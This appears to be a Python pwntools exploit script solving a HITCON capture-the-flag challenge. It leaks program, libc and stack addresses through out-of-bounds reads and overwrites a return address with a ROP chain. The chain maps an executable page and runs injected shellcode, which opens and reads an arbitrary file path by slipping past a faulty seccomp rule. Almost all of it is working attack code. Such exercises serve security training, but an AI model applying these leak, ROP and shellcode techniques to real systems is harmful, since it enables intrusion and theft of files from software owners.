#!/home/gym/.venvs/ctf/bin/python2
import os
import sys
from pwn import *
c = None
m = None

def write_area(idx, data):
    for i in xrange(0, len(data), 8):
        write_memory(idx+(i/8), data[i: i+8])


def get_shell(consts):
    define = ""
    for k, v in consts.iteritems():
        define += " -D"+k+"="+str(v)
    cmd = "gcc "+define+" -s -nostdlib -ffreestanding -fno-stack-protector -fpic -fPIE shell.c -o shell"
    os.system(cmd)
    cmd = "objcopy -O binary --only-section=.text shell shell.bin"
    os.system(cmd)
    with open("shell.bin", 'r') as sh:
        return sh.read()

def main():
    #hitcon{why_libseccomp_cheated_me_Q_Q}
    l = m.load_libc()

    # Leak addresses
    prog_base =  read_memory(-5) - 0x800
    libc_base = read_memory(-9) - 0x70ad2
    stack_leak = read_memory(-25)
    buffer_loc = stack_leak+4
    stack_base = (stack_leak -0x20000) & 0xfffffffffffff000
    page_loc = stack_base - 0x1000000
    print "prog base: " +hex(prog_base)
    print "libc base: "+hex(libc_base)
    print "stack leak: " +hex(stack_leak)
    print "stack base: " +hex(stack_base)
    ret_idx = 203

    # Rop Gadgets
    pop_rdi = libc_base + 0x1fd7a
    pop_rsi = libc_base + 0x1fcbd
    pop_rdx = libc_base + 0x1b92
    pop_rcx = libc_base + 0x1a97b8
    push_rax = libc_base + 0x5988
    # Libc addresses
    mmap_a = l.symbols['mmap'] + libc_base
    read_a = l.symbols['read'] + libc_base
    write_a = l.symbols['write'] + libc_base
    exit_a = l.symbols['exit'] + libc_base
    hook = prog_base + 0x201F80


    prot = 0x2 + 0x4 #WX
    flags = 0x2 + 0x10 + 0x20 +0x400000 # privatem, fixed, anon, uninit

    # Load and compile shell from C source
    # params = {'READ_ADDR': read_a, 'MMAP_ADDR':mmap_a, 'STACK_B':stack_leak+4, 'WRITE_ADDR':write_a, 'RANDOM_HOOK':hook}
    # shell_code = get_shell(params)

    #$path = "/home/user/flag.txt"
    path = sys.argv[1]
    stack_leak -= 500
    # shell that reads a path
    shell_code = asm("mov rsi, "+hex(stack_leak)+"; mov rdx, "+hex(len(path)+1)+"; mov rdi, 0; mov rax, SYS_read; syscall;", arch='amd64', os='linux')
    # opens it (uses the broken seccomp rule)
    shell_code += asm("mov rdi, "+hex(stack_leak)+"; mov rsi, 0; mov rdx, 2; mov rax, 2; syscall;", arch='amd64', os='linux')
    # reads the content to the stack
    shell_code += asm("mov rdi, rax; mov rsi, "+hex(stack_leak)+"; mov rdx, 200; mov rax, SYS_read; syscall;", arch='amd64', os='linux')
    # Sends it back
    shell_code += asm("mov rdi, 1; mov rsi, "+hex(stack_leak)+"; mov rdx, 200; mov rax, SYS_write; syscall;ret;", arch='amd64', os='linux')

    print "SHELL SIZE: " +str(len(shell_code))
    read_size = len(shell_code)
    map_size = 0x1000 * (len(shell_code)/0x1000) + 0x1000
    print "MAP SIZE: " + hex(map_size)

    # ROP chain that mmaps a region
    # read into it and jumps to it
    # mmap
    rop = p64(pop_rdi)
    rop += p64(page_loc)
    rop += p64(pop_rsi)
    rop += p64(map_size)
    rop += p64(pop_rdx)
    rop += p64(prot)
    rop += p64(pop_rcx)
    rop += p64(flags)
    rop += p64(mmap_a)
    # read
    rop += p64(pop_rdi)
    rop += p64(0)
    rop += p64(pop_rsi)
    rop += p64(page_loc)
    rop += p64(pop_rdx)
    rop += p64(read_size)
    rop += p64(read_a)
    # jump to shell
    rop += p64(page_loc)
    rop += p64(exit_a)

    # write open path (absolutely not needed nor used)
    write_area(0, path.ljust(len(path)+(8-(len(path)%8))))
    # overwrite main return address with ropchain
    write_area(ret_idx, rop)
    # trigger exploit
    exit_menu()

    # send the shell code
    c.send(shell_code)
    # send the path
    c.send(path+'\x00')
    nl = c.recv(1)
    # read flag
    c.interactive()

def read_memory(idx):
   c.sendlineafter('?', '1')
   c.sendlineafter('?', str(idx))
   c.recvuntil(':')
   leak = c.recvuntil('\n')
   return int(leak)

def write_memory(idx, data):
   c.sendlineafter('?', '2')
   c.sendlineafter('?', str(idx))
   data.ljust(8, '\x00')
   c.sendlineafter(':', str(u64(data)))

def exit_menu():
   c.sendlineafter('?', '3')

gdbs=[
    #'b *start+0x36a',
    #'b *0x555555554000+0xba6',
    #'b *0x555555554000+0xb64',
    #'b *0x555555554000+0xb9b',
    #'b mmap',
    #'b exit',
    'c'
        ]
bp =[

        ]
if __name__ == "__main__":
    sys.path.append(os.path.expanduser('~/ctf/magicpwn'))
    try:
        from magicpwn import Magic
        # target: vm/native/remote
        # libc: vm/native/remote
        # config: path to config file
        # debug: gdb/villoc/gdbv/none
        #m = Magic('vm', 'gdb', aslr=True, libc='local')
        #m = Magic('vm', 'none', aslr=True, libc='remote')
        #m = Magic('native', 'villoc', aslr=False, libc='local')
        m = Magic('remote', 'none', libc='remote')
        c = m.start(cmds=gdbs, bp=bp, ida=False)
    except ImportError:
        c = process('./artifact')

    main()
